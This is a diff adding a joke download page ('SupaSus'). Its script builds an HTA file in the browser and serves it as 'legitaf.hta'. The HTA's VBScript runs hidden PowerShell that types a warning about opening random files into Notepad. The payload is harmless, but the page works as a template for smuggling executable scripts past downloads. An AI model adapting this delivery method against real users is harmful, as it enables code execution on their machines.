@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Install Your Totally Free and Not Sus Software</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, #ece9e6, #ffffff);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 100px 20px;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: fadeInDown 1s;
+        }
+        p {
+            font-size: 20px;
+            margin-bottom: 40px;
+            animation: fadeInUp 1s;
+            color: #555;
+        }
+        .download-btn {
+            display: inline-block;
+            padding: 15px 40px;
+            font-size: 20px;
+            color: #fff;
+            background-color: #1e90ff;
+            border: none;
+            border-radius: 50px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            animation: fadeInUp 1s;
+            box-shadow: 0 4px 15px rgba(30, 144, 255, 0.75);
+        }
+        .download-btn:hover {
+            background-color: #1c86ee;
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(30, 144, 255, 0.85);
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #f9f9f9;
+            color: #777;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Install Your Totally Free and Not Sus Software</h1>
+        <p>Click the button below to download the <strong>legitaf.hta</strong> file to your computer.</p>
+        <a id="downloadLink" href="#" class="download-btn">Download Now</a>
+    </div>
+
+    <footer>
+        &copy; 2024 SupaSus. All rights reserved.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var htaContent = `<html>
+<head>
+    <title>you done goof'd</title>
+    <HTA:APPLICATION
+        ID="ExecutePS"
+        APPLICATIONNAME="ExecutePS"
+        BORDER="thin"
+        CAPTION="yes"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+        WINDOWSTATE="normal">
+</head>
+<body>
+    <script type="text/vbscript">
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell -command ""Start-Process 'notepad'; Start-Sleep -Seconds 1; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('don''t open random files lol . . .')""", 0, false
+    <\/script>
+</body>
+</html>`;
+
+            var blob = new Blob([htaContent], { type: 'application/octet-stream' });
+            var url = URL.createObjectURL(blob);
+            var link = document.getElementById('downloadLink');
+            link.href = url;
+            link.download = 'legitaf.hta';
+        });
+    </script>
+</body>
+</html>
